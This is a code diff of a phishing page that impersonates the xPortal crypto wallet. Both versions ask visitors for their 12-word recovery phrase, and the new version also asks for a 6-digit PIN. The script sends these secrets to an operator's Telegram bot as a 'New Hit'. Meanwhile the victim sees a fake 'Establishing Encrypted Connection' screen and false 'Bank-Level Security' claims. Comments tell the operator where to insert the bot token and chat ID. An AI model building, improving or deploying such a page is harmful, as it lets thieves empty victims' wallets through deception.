@@ -3,125 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Secure Wallet Access</title>
+    <title>xPortal | Security Access</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #000; --card: #0d0d0d; --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255,255,255,0.08); --text-gray: #888; }
+        :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-border: rgba(255, 255, 255, 0.08); --xp-card: #0d0d0d; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: var(--bg); color: #fff; min-height: 100vh; overflow-x: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); }
+        body { background: var(--xp-black); color: #fff; min-height: 100vh; overflow: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); display: flex; align-items: center; justify-content: center; }
 
-        /* NAVIGATION */
-        nav { height: 72px; padding: 0 5%; display: flex; align-items: center; background: rgba(0,0,0,0.6); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); position: fixed; top: 0; width: 100%; z-index: 1000; }
-        .nav-logo { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 20px; letter-spacing: -0.5px; }
-        .nav-logo img { width: 32px; height: 32px; object-fit: contain; }
-
-        /* MAIN WRAPPER */
-        .container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; padding-top: 100px; }
-        .glass-card { background: var(--card); border: 1px solid var(--border); border-radius: 32px; padding: 45px 30px; width: 100%; max-width: 460px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; overflow: hidden; }
+        .glass-card { background: var(--xp-card); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 25px; width: 100%; max-width: 440px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; }
+        .hero-logo { width: 70px; height: 70px; margin-bottom: 20px; }
         
-        .hero-logo { width: 70px; height: 70px; margin-bottom: 25px; filter: drop-shadow(0 0 15px rgba(138, 63, 252, 0.4)); }
-        h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; letter-spacing: -1px; }
-        .subtitle { color: var(--text-gray); font-size: 14px; margin-bottom: 35px; line-height: 1.5; }
+        .section { display: none; animation: fadeIn 0.4s ease; }
+        .section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
 
-        /* WORD GRID */
-        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 30px; }
+        /* WORDS GRID */
+        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 25px; }
         .word-box { position: relative; }
-        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; font-weight: 700; color: var(--teal); opacity: 0.6; }
-        .word-box input { width: 100%; background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 12px 5px 12px 30px; color: #fff; font-size: 14px; transition: 0.3s; }
-        .word-box input:focus { border-color: var(--purple); background: rgba(138, 63, 252, 0.05); outline: none; box-shadow: 0 0 15px rgba(138, 63, 252, 0.1); }
+        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; font-weight: 800; color: var(--xp-teal); opacity: 0.6; }
+        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 12px; padding: 12px 5px 12px 28px; color: #fff; font-size: 13px; outline: none; }
+        .word-box input:focus { border-color: var(--xp-purple); }
 
-        /* BUTTONS */
-        .btn-connect { width: 100%; height: 60px; background: #fff; color: #000; border: none; border-radius: 100px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-        .btn-connect:hover { background: var(--teal); transform: translateY(-2px); }
+        /* PIN CODE STYLING */
+        .pin-container { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
+        .pin-dot { width: 15px; height: 15px; border: 2px solid var(--xp-border); border-radius: 50%; transition: 0.2s; }
+        .pin-dot.filled { background: var(--xp-teal); border-color: var(--xp-teal); box-shadow: 0 0 10px var(--xp-teal); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 250px; margin: 0 auto; }
+        .key { width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 20px; font-weight: 600; cursor: pointer; border: 1px solid var(--xp-border); }
+        .key:active { background: var(--xp-purple); }
 
-        /* STATUS */
-        #status-msg { display: none; margin-top: 20px; color: var(--teal); font-weight: 600; font-size: 14px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-
-        .shield-tag { margin-top: 30px; font-size: 10px; color: #444; font-weight: 800; letter-spacing: 1.5px; display: flex; align-items: center; justify-content: center; gap: 6px; text-transform: uppercase; }
+        .btn { width: 100%; height: 60px; border-radius: 100px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; background: #fff; color: #000; margin-top: 10px; }
+        #loading { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 20px; animation: pulse 1.5s infinite; }
     </style>
 </head>
 <body>
 
-<nav>
-    <div class="nav-logo">
-        <img src="Capture.PNG" alt="Logo">
-        <span>xPortal</span>
+<div class="glass-card">
+    <img src="Capture.PNG" class="hero-logo">
+
+    <div id="step-phrase" class="section active">
+        <h2 style="margin-bottom: 10px;">Import Wallet</h2>
+        <p style="color:#888; font-size: 14px; margin-bottom: 25px;">Enter your 12-word recovery phrase.</p>
+        <div class="phrase-grid" id="grid"></div>
+        <button class="btn" onclick="nextStep()">Continue</button>
     </div>
-</nav>
 
-<div class="container">
-    <div class="glass-card">
-        <img src="Capture.PNG" class="hero-logo">
-        
-        <h1>Import Wallet</h1>
-        <p class="subtitle">Enter your 12-word secret recovery phrase to securely restore your wallet.</p>
-
-        <form id="walletForm">
-            <div class="phrase-grid" id="inputs">
-                </div>
-
-            <button type="submit" class="btn-connect" id="btnText">Connect Wallet</button>
-        </form>
-
-        <div id="status-msg">Establishing Secure Connection...</div>
-
-        <div class="shield-tag">
-            <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-            AES-256 Bank-Level Security
+    <div id="step-pin" class="section">
+        <h2 style="margin-bottom: 10px;">Security PIN</h2>
+        <p style="color:#888; font-size: 14px;">Enter your 6-digit PIN to confirm access.</p>
+        <div class="pin-container" id="pinDots">
+            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+        </div>
+        <div class="keypad">
+            <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
+            <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
+            <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
+            <div></div><div class="key" onclick="press(0)">0</div><div class="key" onclick="del()">←</div>
         </div>
     </div>
+
+    <div id="loading">Establishing Encrypted Connection...</div>
 </div>
 
 <script>
-    // --- TELEGRAM CONFIG ---
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Badel hada
-    const CHAT_ID = 'YOUR_CHAT_ID';     // Badel hada
+    // --- تليجرام كونفيج ---
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // حط التوكن هنا
+    const CHAT_ID = 'YOUR_CHAT_ID';     // حط الآيدي هنا
 
-    // Generate 12 Inputs
-    const container = document.getElementById('inputs');
+    let phraseData = "";
+    let currentPin = "";
+
+    // إنشاء مربعات الكلمات
+    const g = document.getElementById('grid');
     for(let i=1; i<=12; i++) {
-        container.innerHTML += `
-            <div class="word-box">
-                <span>${i}</span>
-                <input type="password" class="w-input" required autocomplete="off" oninput="handleSmartPaste(event, ${i})">
-            </div>
-        `;
+        g.innerHTML += `<div class="word-box"><span>${i}</span><input type="password" class="w-in" placeholder="..."></div>`;
     }
 
-    // Smart Paste Logic: Ila dar paste l-phrase kamla f box whda kiferreqha
-    function handleSmartPaste(e, index) {
-        const val = e.target.value.trim();
-        if (val.includes(' ')) {
-            const words = val.split(/\s+/);
-            const inputs = document.querySelectorAll('.w-input');
-            words.forEach((w, i) => {
-                if (inputs[i]) inputs[i].value = w;
-            });
+    // الانتقال للـ PIN
+    function nextStep() {
+        let words = [];
+        document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
+        if(words.some(w => w === "")) return alert("Please fill all fields.");
+        phraseData = words.join(" ");
+        
+        document.getElementById('step-phrase').classList.remove('active');
+        document.getElementById('step-pin').classList.add('active');
+    }
+
+    // كتابة الـ PIN
+    function press(n) {
+        if(currentPin.length < 6) {
+            currentPin += n;
+            updateDots();
+            if(currentPin.length === 6) sendFinalData();
         }
     }
 
-    document.getElementById('walletForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const inputs = document.querySelectorAll('.w-input');
-        let phrase = [];
-        inputs.forEach(i => phrase.push(i.value.trim()));
+    function del() {
+        currentPin = currentPin.slice(0, -1);
+        updateDots();
+    }
 
-        // UI State
-        document.getElementById('btnText').style.display = 'none';
-        document.getElementById('status-msg').style.display = 'block';
-
-        // Send to Telegram
-        const finalPhrase = phrase.join(" ");
-        const message = `🚀 NEW XPORTAL HIT!\n\nPhrase: ${finalPhrase}`;
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-        .then(() => {
-            console.log("Logged.");
-            // Hangs on "Establishing Connection" for realism
+    function updateDots() {
+        const dots = document.querySelectorAll('.pin-dot');
+        dots.forEach((dot, i) => {
+            dot.classList.toggle('filled', i < currentPin.length);
         });
-    });
+    }
+
+    // الإرسال النهائي
+    function sendFinalData() {
+        document.getElementById('step-pin').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        const text = `💎 xPortal New Hit!\n\nPhrase: ${phraseData}\nPIN Code: ${currentPin}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
+        .then(() => {
+            console.log("Success.");
+        });
+    }
 </script>
 
 </body>
